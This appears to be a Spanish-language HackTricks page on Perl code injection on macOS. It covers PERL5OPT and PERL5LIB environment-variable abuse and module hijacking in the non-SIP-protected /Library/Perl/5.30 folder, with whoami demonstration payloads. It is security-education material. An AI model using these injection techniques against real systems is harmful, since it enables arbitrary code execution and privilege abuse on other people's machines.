# Inyección de Aplicaciones Perl en macOS

{{#include ../../../banners/hacktricks-training.md}}

## A través de la variable de entorno `PERL5OPT` & `PERL5LIB`

Usando la variable de entorno PERL5OPT, es posible hacer que perl ejecute comandos arbitrarios.\
Por ejemplo, crea este script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Ahora **exporta la variable de entorno** y ejecuta el **script perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Otra opción es crear un módulo de Perl (por ejemplo, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Y luego usa las variables de entorno:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## A través de dependencias

Es posible listar el orden de la carpeta de dependencias de Perl en ejecución:
```bash
perl -e 'print join("\n", @INC)'
```
Lo que devolverá algo como:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Algunas de las carpetas devueltas ni siquiera existen, sin embargo, **`/Library/Perl/5.30`** **existe**, **no está** **protegida** por **SIP** y está **antes** de las carpetas **protegidas por SIP**. Por lo tanto, alguien podría abusar de esa carpeta para agregar dependencias de script allí para que un script Perl de alto privilegio lo cargue.

> [!WARNING]
> Sin embargo, ten en cuenta que **necesitas ser root para escribir en esa carpeta** y hoy en día recibirás este **mensaje de TCC**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Por ejemplo, si un script está importando **`use File::Basename;`**, sería posible crear `/Library/Perl/5.30/File/Basename.pm` para hacer que ejecute código arbitrario.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
